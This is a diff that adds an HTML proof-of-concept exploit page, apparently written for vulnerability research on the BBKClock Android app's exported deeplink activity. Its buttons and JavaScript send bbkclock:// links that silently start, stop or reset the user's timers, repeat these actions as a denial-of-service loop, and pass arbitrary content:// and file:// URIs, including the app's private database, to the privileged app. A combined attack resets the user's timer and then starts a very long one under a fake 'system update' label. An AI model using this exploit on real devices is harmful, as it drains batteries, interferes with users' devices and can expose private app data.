@@ -1,0 +1,136 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BBKClock Deeplink PoC</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, sans-serif; background: #1a1a2e; color: #eee; padding: 20px; }
+h1 { text-align: center; margin-bottom: 10px; color: #e94560; }
+.subtitle { text-align: center; color: #888; margin-bottom: 30px; font-size: 14px; }
+.section { background: #16213e; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+.section h2 { color: #e94560; margin-bottom: 15px; font-size: 16px; }
+.btn-group { display: flex; flex-wrap: wrap; gap: 10px; }
+button { padding: 12px 20px; border: none; border-radius: 8px; font-size: 14px; cursor: pointer; transition: all 0.2s; font-weight: 500; }
+button:active { transform: scale(0.95); }
+.btn-danger { background: #e94560; color: #fff; }
+.btn-warning { background: #f59e0b; color: #000; }
+.btn-info { background: #3b82f6; color: #fff; }
+.btn-purple { background: #8b5cf6; color: #fff; }
+.btn-green { background: #10b981; color: #fff; }
+.log { background: #0f0f23; border-radius: 8px; padding: 15px; margin-top: 20px; font-family: monospace; font-size: 12px; max-height: 200px; overflow-y: auto; }
+.log p { margin: 4px 0; color: #4ade80; }
+.log p.fail { color: #f87171; }
+.note { font-size: 12px; color: #888; margin-top: 8px; }
+</style>
+</head>
+<body>
+<h1>BBKClock Deeplink PoC</h1>
+<p class="subtitle">com.android.BBKClock v8.0.3.7 | TimerDeepLinkActivity exported + BROWSABLE</p>
+
+<div class="section">
+<h2>1. 计时器静默操控（核心漏洞）</h2>
+<div class="btn-group">
+<button class="btn-danger" onclick="trigger('set_timer&type=start&time=86400&skip_ui=1','静默启动24h计时器')">静默启动 24h 计时器</button>
+<button class="btn-danger" onclick="trigger('set_timer&type=start&time=999999&skip_ui=1','静默启动超长计时器(电池耗尽)')">超长计时器(电池耗尽)</button>
+<button class="btn-danger" onclick="trigger('set_timer&type=stop&skip_ui=1','静默暂停用户计时器')">静默暂停计时器</button>
+<button class="btn-danger" onclick="trigger('set_timer&type=reset&skip_ui=1','静默重置用户计时器')">静默重置计时器</button>
+<button class="btn-warning" onclick="trigger('set_timer&type=start&time=1&label=%E6%81%B6%E6%84%8F%E8%AE%A1%E6%97%B6&skip_ui=1','自定义标签计时器')">自定义标签计时器</button>
+</div>
+<p class="note">skip_ui=1 使操作完全静默，用户无任何感知。计时器启动后产生前台服务+通知，持续消耗电量。</p>
+</div>
+
+<div class="section">
+<h2>2. 计时器 DoS（循环干扰）</h2>
+<div class="btn-group">
+<button class="btn-danger" onclick="dosTimer()">启动循环干扰 (10次 start/stop)</button>
+<button class="btn-warning" onclick="rapidReset()">快速重置轰炸 (5次)</button>
+</div>
+<p class="note">模拟恶意网页反复触发，导致用户计时器不断被操控。</p>
+</div>
+
+<div class="section">
+<h2>3. 任意 URI 注入（Confused Deputy）</h2>
+<div class="btn-group">
+<button class="btn-purple" onclick="trigger('set_ringtone&title=PoC&ring_type=4&uri=content://com.android.providers.media.documents/audio/1','注入媒体URI')">注入媒体 URI</button>
+<button class="btn-purple" onclick="trigger('set_ringtone&title=PoC&ring_type=4&uri=content://settings/system','注入Settings URI')">注入 Settings URI</button>
+<button class="btn-purple" onclick="trigger('set_ringtone&title=PoC&ring_type=4&uri=file:///data/data/com.android.BBKClock/databases/timer.db','注入私有文件URI')">注入私有文件 URI</button>
+</div>
+<p class="note">BBKClock 为系统应用，拥有 INTERACT_ACROSS_USERS 等特权。传入的 URI 由 BBKClock 的 ContentResolver 代为访问。</p>
+</div>
+
+<div class="section">
+<h2>4. UI 劫持 / 强制导航</h2>
+<div class="btn-group">
+<button class="btn-info" onclick="trigger('tab_clock&clock_id=1','强制打开闹钟详情')">定位闹钟详情</button>
+<button class="btn-info" onclick="trigger('tab_clock&clock_time_hour=7&clock_time_minute=30','按时间定位闹钟')">按时间定位闹钟</button>
+<button class="btn-info" onclick="trigger('set_alarm','强制打开新建闹钟')">强制新建闹钟</button>
+<button class="btn-info" onclick="trigger('tab_stopwatch','强制打开秒表')">强制打开秒表</button>
+<button class="btn-info" onclick="trigger('tab_world_time','强制打开世界时钟')">强制打开世界时钟</button>
+<button class="btn-info" onclick="trigger('settings','强制打开设置')">强制打开设置</button>
+<button class="btn-info" onclick="trigger('tab_timer','强制打开计时器Tab')">强制打开计时器</button>
+</div>
+<p class="note">可从任意 App 或网页强制将用户导航到时钟应用的特定页面，打断用户当前操作。</p>
+</div>
+
+<div class="section">
+<h2>5. 组合攻击场景</h2>
+<div class="btn-group">
+<button class="btn-green" onclick="comboAttack()">组合攻击：重置+启动超长+静默</button>
+</div>
+<p class="note">先销毁用户现有计时器，再静默启动一个超长计时器，最大化干扰。</p>
+</div>
+
+<div class="log" id="log"><p>[ready] 等待触发...</p></div>
+
+<script>
+const SCHEME = 'bbkclock://com.android.bbkclock?function=';
+
+function trigger(params, desc) {
+    const url = SCHEME + params;
+    log('[*] ' + desc);
+    log('    URL: ' + url);
+    try {
+        window.location.href = url;
+        log('[+] 已触发');
+    } catch(e) {
+        log('[-] 触发失败: ' + e.message, true);
+    }
+}
+
+function dosTimer() {
+    log('[*] 启动循环干扰...');
+    let count = 0;
+    const interval = setInterval(() => {
+        if (count >= 10) { clearInterval(interval); log('[+] 循环干扰完成'); return; }
+        const action = count % 2 === 0 ? 'start&time=60' : 'stop';
+        trigger('set_timer&type=' + action + '&skip_ui=1', 'DoS #' + (count+1) + ': ' + action);
+        count++;
+    }, 800);
+}
+
+function rapidReset() {
+    log('[*] 快速重置轰炸...');
+    for (let i = 0; i < 5; i++) {
+        setTimeout(() => trigger('set_timer&type=reset&skip_ui=1', '重置 #' + (i+1)), i * 500);
+    }
+}
+
+function comboAttack() {
+    log('[*] 组合攻击开始...');
+    trigger('set_timer&type=reset&skip_ui=1', 'Step1: 重置现有计时器');
+    setTimeout(() => trigger('set_timer&type=start&time=999999&label=%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%96%B0&skip_ui=1', 'Step2: 静默启动超长计时器(伪装标签)'), 1000);
+}
+
+function log(msg, isFail) {
+    const el = document.getElementById('log');
+    const p = document.createElement('p');
+    p.textContent = new Date().toLocaleTimeString() + ' ' + msg;
+    if (isFail) p.className = 'fail';
+    el.appendChild(p);
+    el.scrollTop = el.scrollHeight;
+}
+</script>
+</body>
+</html>
